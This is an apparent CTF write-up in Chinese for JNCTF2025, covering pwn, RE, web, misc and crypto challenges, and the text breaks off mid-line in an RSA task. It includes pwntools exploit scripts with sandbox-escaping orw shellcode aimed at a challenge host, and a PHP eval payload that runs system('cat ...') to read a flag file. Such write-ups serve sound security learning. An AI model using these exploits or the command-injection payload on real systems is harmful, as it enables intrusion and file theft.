    <content type="html"><![CDATA[<h1 id="JNCTF2025-WP"><a href="#JNCTF2025-WP" class="headerlink" title="JNCTF2025 WP"></a>JNCTF2025 WP</h1><p>  <em>————Sally</em></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="1-signin"><a href="#1-signin" class="headerlink" title="1. signin"></a>1. signin</h3><p>unregister的权限问题，可以用Admin账户去注销root账户，然后重新注册root账户就能拿到管理员权限</p><p><img src="/../images/1/image-20250323191804461.png" alt="image-20250323191804461"></p><p><img src="/../images/1/image-20250323191840975.png" alt="image-20250323191840975"></p><h3 id="2-shellcoe-master（非预期解法）"><a href="#2-shellcoe-master（非预期解法）" class="headerlink" title="2. shellcoe_master（非预期解法）"></a>2. shellcoe_master（非预期解法）</h3><p>这个题给了个沙箱，限制只能用orw，而且write一次只能输出一个字节，还开了PIE保护</p><p><img src="/../images/1/image-20250323192427502.png" alt="image-20250323192427502"></p><p>在执行shellcode之前，除r15和rip之外的寄存器全部清0（指向buf的位置）。而且在执行shellcode的时候buf段不可写，也代表着push和pop之类的指令不能用了。</p><p>然后想到bss段rw权限，直接把flag写在bss段，然后orw，一个个字节读出来就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># r=process(&#x27;./sc_master_patched&#x27;)</span><br>r=remote(<span class="hljs-string">&#x27;172.18.137.75&#x27;</span>,<span class="hljs-number">32403</span>)<br><span class="hljs-comment"># bss=0x4078</span><br><span class="hljs-comment"># gdb.attach(r,&#x27;b *$rebase(0x161B)&#x27;)</span><br><br><span class="hljs-comment">#shellcode</span><br><span class="hljs-comment"># 0. read(0,bss+base,0x30)</span><br><span class="hljs-comment"># 1. open(&#x27;./flag&#x27;)</span><br><span class="hljs-comment"># 2. read(0, buf+base+0x100, 0x30)</span><br><span class="hljs-comment"># 3. write(1, buf+base+0x100, 1)</span><br><span class="hljs-comment"># 4. write(1, buf+base+0x101,1)</span><br><span class="hljs-comment"># ......</span><br><br>shellcode1=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">add r15,0x4078</span><br><span class="hljs-string">mov rsp,r15</span><br><span class="hljs-string">mov rdx,0x50</span><br><span class="hljs-string">mov rsi,r15</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>payload0=<span class="hljs-string">b&#x27;flag\x00&#x27;</span><br>shellcode2=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rax,2</span><br><span class="hljs-string">mov rdi,r15</span><br><span class="hljs-string">xor rsi,rsi</span><br><span class="hljs-string">xor rdx,rdx</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov r8,rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">mov rdi,r8</span><br><span class="hljs-string">add r15,0x100</span><br><span class="hljs-string">mov rsi,r15</span><br><span class="hljs-string">mov rdx,0x50</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">add rsp,0x100</span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">mov rsi,r15</span><br><span class="hljs-string">mov rdx,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">add r15,41</span><br><span class="hljs-string">mov rsi,r15</span><br><span class="hljs-string">mov rdx,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">add r15,1</span><br><span class="hljs-string">mov rsi,r15</span><br><span class="hljs-string">mov rdx,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">add r15,1</span><br><span class="hljs-string">mov rsi,r15</span><br><span class="hljs-string">mov rdx,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">add r15,1</span><br><span class="hljs-string">mov rsi,r15</span><br><span class="hljs-string">mov rdx,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">add r15,1</span><br><span class="hljs-string">mov rsi,r15</span><br><span class="hljs-string">mov rdx,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>payload=shellcode1<br>payload+=shellcode2<br><br>r.sendline(payload)<br>r.sendline(payload0)<br>r.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="3-shellcode-master-revenge"><a href="#3-shellcode-master-revenge" class="headerlink" title="3. shellcode_master_revenge"></a>3. shellcode_master_revenge</h3><p><img src="/../images/1/image-20250323193200743.png" alt="image-20250323193200743"></p><p>把地址换成了固定的0x114514000，不能把flag写在bss段了（</p><p>思路还是一样的，不过这次要利用read读数据到不可写地址时返回负数的原理来爆破找一个可写的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># r=process(&#x27;./sc_master_revenge&#x27;)</span><br>r=remote(<span class="hljs-string">&#x27;172.18.137.75&#x27;</span>,<span class="hljs-number">32233</span>)<br><span class="hljs-comment"># bss=0x4078</span><br><span class="hljs-comment"># gdb.attach(r,&#x27;b *$rebase(0x1656)&#x27;)</span><br><br>shellcode0=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">movabs r14,0x7fffffff0000</span><br><span class="hljs-string">loop_start:</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    xor rdi, rdi</span><br><span class="hljs-string">    mov rsi, r14</span><br><span class="hljs-string">    mov rdx, 5</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    test rax, rax</span><br><span class="hljs-string">    jns continue_exec</span><br><span class="hljs-string">    sub r14, 0x10000</span><br><span class="hljs-string">    jmp loop_start</span><br><span class="hljs-string">continue_exec:</span><br><span class="hljs-string">    mov r15, rax</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>shellcode1=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    mov rdi, 1 </span><br><span class="hljs-string">    movabs r11, 0x114514001</span><br><span class="hljs-string">    mov rsi, r11</span><br><span class="hljs-string">    mov rdx, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    xor rax,rax</span><br><span class="hljs-string">    mov rdi,0</span><br><span class="hljs-string">    mov rdx,0x50</span><br><span class="hljs-string">    mov rsi,r14</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>shellcode2=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rax,2</span><br><span class="hljs-string">mov rdi,r14</span><br><span class="hljs-string">xor rsi,rsi</span><br><span class="hljs-string">xor rdx,rdx</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov r8,rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">mov rdi,r8</span><br><span class="hljs-string">mov rsi,r14</span><br><span class="hljs-string">mov rdx,0x50</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov r9,rax</span><br><span class="hljs-string">xor r10,r10</span><br><span class="hljs-string"></span><br><span class="hljs-string">loop:</span><br><span class="hljs-string">    cmp r10, r9</span><br><span class="hljs-string">    jge exit_program </span><br><span class="hljs-string">    </span><br><span class="hljs-string">    mov rax,1</span><br><span class="hljs-string">    mov rdi,1</span><br><span class="hljs-string">    lea rsi,[r14+r10]</span><br><span class="hljs-string">    mov rdx,1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    add r10,1</span><br><span class="hljs-string">    jmp loop      </span><br><span class="hljs-string">exit_program:</span><br><span class="hljs-string">    mov rax,60</span><br><span class="hljs-string">    xor rdi,rdi</span><br><span class="hljs-string">    syscall     </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>payload=shellcode0<br>payload+=shellcode1<br>payload+=shellcode2<br>payload0 = <span class="hljs-string">b&#x27;flag\x00&#x27;</span><br><br>r.sendline(payload)<br>r.send(payload0)<br>r.sendline(payload0)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>在原来的exp上又稍微改进了一下，在0x7fffffff000的地址开始爆破</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="compose"><a href="#compose" class="headerlink" title="compose"></a>compose</h3><p>在class3.dex里面找到Main activity和Main activity.kt，可以看出是一个RC4加密，密钥是Tanggegehaoshuai，直接写脚本就爆出来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python">key = <span class="hljs-string">b&#x27;TanggegeHaoShuai&#x27;</span><br>enc = <span class="hljs-built_in">bytes</span>([<br>    <span class="hljs-number">0x12</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x61</span>,<br>    <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xDF</span>,<br>    <span class="hljs-number">0xED</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xF6</span>,<br>    <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x3A</span>,<br>    <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x89</span><br>])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_decrypt</span>(<span class="hljs-params">key, data</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># Key scheduling</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>    <span class="hljs-comment"># Pseudo-random generation</span><br>    i = j = <span class="hljs-number">0</span><br>    result = []<br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        k = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        result.append(byte ^ k)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(result)<br><br>decrypted = rc4_decrypt(key, enc)<br><span class="hljs-built_in">print</span>(decrypted.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br></code></pre></td></tr></table></figure><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-eateateat"><a href="#1-eateateat" class="headerlink" title="1. eateateat"></a>1. eateateat</h3><p>小游戏，没什么好说的，直接看源码就秒了</p><p><img src="/../images/1/image-20250323194143037.png" alt="image-20250323194143037"></p><h3 id="2-test-php"><a href="#2-test-php" class="headerlink" title="2.test php"></a>2.test php</h3><p>先贴源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">2025</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;活在当下2025，但好像不对？？？&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;哥们，这是年份，你在干嘛！&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>, <span class="hljs-number">0</span>)==<span class="hljs-number">2025</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;咦，居然被你猜对了，还得是2025!&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;新年快乐啊！但送不了你flag！&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;这才是第一关通过了！&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$b</span>[<span class="hljs-string">&#x27;JNSEC&#x27;</span>] == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;???这都被你猜对了？？&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;但这好像只是第二关！&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$d</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>];<br>    <span class="hljs-variable">$e</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e&#x27;</span>];<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$d</span> !== <span class="hljs-variable">$e</span>) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$d</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$e</span>))) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;恭喜你！好像就马上要成功了！&quot;</span>;<br>        <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br>        <span class="hljs-comment">// flag在当前目录下的flag文件中</span><br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo new Reflection(<span class="hljs-subst">$f</span>());&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>第三部分可以用md5碰撞，然后给f赋值为system(‘ls -al’)一类的命令来看目录，找到flag后cat一下就好</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">a=JNSEC=202cb962ac59075b964b07152d234b70&amp;c=123&amp;d=QNKCDZO&amp;e=240610708&amp;f=system(&#x27;cat%20../../../flag.php&#x27;)<br></code></pre></td></tr></table></figure><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><p><del>唉，misc就是一坨</del></p><h3 id="1-stego"><a href="#1-stego" class="headerlink" title="1. stego"></a>1. stego</h3><p>stego.qoi一个少见的图片格式，去网上找找github的qoi格式转换，把格式换回来就能看见flag</p><p><a href="https://github.com/phoboslab/qoi">phoboslab&#x2F;qoi: The “Quite OK Image Format” for fast, lossless image compression</a></p><h3 id="2-ez-pickle-jail"><a href="#2-ez-pickle-jail" class="headerlink" title="2.ez_pickle_jail"></a>2.ez_pickle_jail</h3><p>是一个python沙箱，可以利用低版本的pickle数据，这样在反序列后再转序列化就会导致内容不同</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> binascii<br><br>pickle_input = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Enter the base64 encoded pickle: &quot;</span>)<br><span class="hljs-keyword">try</span>:<br>    pickle_data = base64.b64decode(pickle_input)<br><span class="hljs-keyword">except</span> binascii.Error <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid base64 encoding&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">try</span>:<br>    data = pickle.loads(pickle_data)<br><span class="hljs-keyword">except</span> pickle.UnpicklingError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid pickle data&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br>pickle_output = pickle.dumps(data)<br><span class="hljs-keyword">if</span> pickle_output != pickle_data:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>).read())<br><span class="hljs-comment"># too many solutions,isn&#x27;t it?</span><br><br><br><br>JNCTF&#123;hhhhTh1s_Re@1_E@sy_P7P1111&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br>data = <span class="hljs-number">0</span><br>pickle_data = pickle.dumps(data, protocol=<span class="hljs-number">0</span>)<br>encoded = base64.b64encode(pickle_data).decode()<br><span class="hljs-built_in">print</span>(encoded)<br></code></pre></td></tr></table></figure><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="1-story"><a href="#1-story" class="headerlink" title="1.story"></a>1.story</h3><p>给了一大段换表后的文本，这里可以直接就让大语言模型帮忙完成统计爆破</p><h3 id="2-悲伤的故事（有点像misc了）"><a href="#2-悲伤的故事（有点像misc了）" class="headerlink" title="2. 悲伤的故事（有点像misc了）"></a>2. 悲伤的故事（有点像misc了）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plant">这是一个悲伤的故事，他眼含泪水推开酒吧那扇厚重的门，脑中还不断回荡着酒吧里的各种乐器声，在酒精的麻痹下，他浑浑噩噩的走到了家中，看着小院栅栏中的鸟语花香，他又回想起曾经的那段时光，但他知道，他该放下了，就这样，他回到了自己的房间里，发现桌上有着一个古典雅致的盒子，他瞬间清醒了不少，激动的连忙赶过去，用钥匙打开，里面是封古典的信件，他双手颤抖着打开这封信：<br>亲爱的维吉！<br>三年了，你是否还记得“VERSd3FASFhjUkpyX19tMTFAQXsxMUdfX199”是什么意思，如果心中有那答案，就来找我吧。<br><br></code></pre></td></tr></table></figure><p>在文本里能看出有栅栏加密（offset&#x3D;3），base64，维吉尼亚加密。</p><p>base64之后：TDRwq@HXcRJr__m11@A{11G___}</p><p>栅栏解密：TRADJ{Rr1w_1q_G@m_H1_X1_c@}</p><p>根据JNCTF{}的flag格式，可以推断出密钥就是key</p><p>最后维吉尼亚解密：JNCTF{Th1s_1s_W@i_J1_N1_y@}</p><h3 id="3-熟悉的故人"><a href="#3-熟悉的故人" class="headerlink" title="3. 熟悉的故人"></a>3. 熟悉的故人</h3><p>源码：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs makefile">import libnum<br>import gmpy2<br>import random<br>from secrets import FLAG<br><br>p = libnum.generate_prime(1024 + random.randint(0, 1024))<br>q = gmpy2.next_prime(p)<br>e = 65537<br>m = FLAG<br>m = libnum.s2n(m)<br>n = p*q<br>phi_n = (p-1)*(q-1)<br>d = libnum.invmod(e,phi_n)<br>c = pow(m,e,n)<br><br>print(<span class="hljs-string">&quot;n =&quot;</span>,n)<br>print (<span class="hljs-string">&quot;e =&quot;</span>,e)<br>print (<span class="hljs-string">&quot;c =&quot;</span>,c)<br><br><span class="hljs-comment"># n = 299487015341597647919776121004167231949688268241700414027108990830625623733773719845841268481813362766547912866733711608177564250583355016088619602664748425336481765034201744572985159895585715150798269166534598956939724628696559498880597219784298678035926538950792013309608367104567539694805267059251508650074879211671636277899101015682266724064486585722087645838229287808682200953448105025969146455228490015983463746790376132783796872114120190783210924155244559381221390948899033151290151152600368322574929968834669432260194965876835069287868333462555623127602208275637571642586991525702340484853548458548057993639750566860524849624229544573184492710462829280342457207433467447389201079678219686250530932773758629428257347183339748908201954402303</span><br><span class="hljs-comment"># e = 65537</span><br><span class="hljs-comment"># c = 